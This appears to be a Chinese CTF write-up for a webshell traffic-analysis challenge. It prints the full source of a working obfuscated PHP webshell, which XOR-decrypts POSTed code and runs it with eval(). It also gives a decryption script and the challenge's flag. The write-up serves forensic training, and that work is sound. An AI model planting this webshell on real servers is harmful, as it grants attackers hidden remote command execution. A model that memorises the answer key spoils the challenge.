# Weevil's Whisper

> 分类：Misc（流量分析）

## 题目描述

webshell 流量分析。攻击者先上传 shell.php，再连接 webshell 进行命令执行。

## 考察知识点

- webshell 流量分析
- XOR 加密 + gzcompress + base64 逆向解密

## 解法

1. 过滤 http 协议，发现先是上传了一个 shell.php，再连接 webshell 执行命令。
2. 追踪 TCP 流，得到上传的加密 webshell：

```php
<?php
$k = "161ebd7d";
$kh = "45089b3446ee";
$kf = "4e0d86dbcf92";
$p = "lFDu8RwONqmag5ex";
function x($t, $k) {
    $c = strlen($k); $l = strlen($t); $o = "";
    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }
    return $o;
}
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]), $k)));
    $o = @ob_get_contents();
    @ob_end_clean();
    $r = @base64_encode(@x(@gzcompress($o), $k));
    print("$p$kh$r$kf");
}
?>
```

3. 编写解密脚本逆向（先去掉前缀/后缀 → base64 解码 → XOR → gzuncompress）：

```php
<?php
$key = "161ebd7d";
function xorEncryptDecrypt($input, $key) {
    $keyLength = strlen($key);
    $inputLength = strlen($input);
    $output = "";
    for ($i = 0; $i < $inputLength;) {
        for ($j = 0; $j < $keyLength && $i < $inputLength; $j++, $i++) {
            $output .= $input[$i] ^ $key[$j];
        }
    }
    return $output;
}
$response = "lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92";
$prefix = "lFDu8RwONqmag5ex";
$header = "45089b3446ee";
$footer = "4e0d86dbcf92";
$encryptedData = substr($response, strlen($prefix) + strlen($header), -strlen($footer));
$base64Decoded = base64_decode($encryptedData);
$decryptedData = xorEncryptDecrypt($base64Decoded, $key);
$uncompressedData = gzuncompress($decryptedData);
echo $uncompressedData;
?>
```

4. 对最后一个包解密即可得到 flag。

## 参考答案

`flag{arsjxh-sjhxbr-3rdd78dfsh-3ndidjl}`

## 来源

- 作者：Liebert77 | https://blog.csdn.net/2301_80185313/article/details/145268362
- 作者：frank1q22 | https://xz.aliyun.com/news/17083
- 作者：H轨迹H | https://www.cnblogs.com/GuijiH6/p/18680901
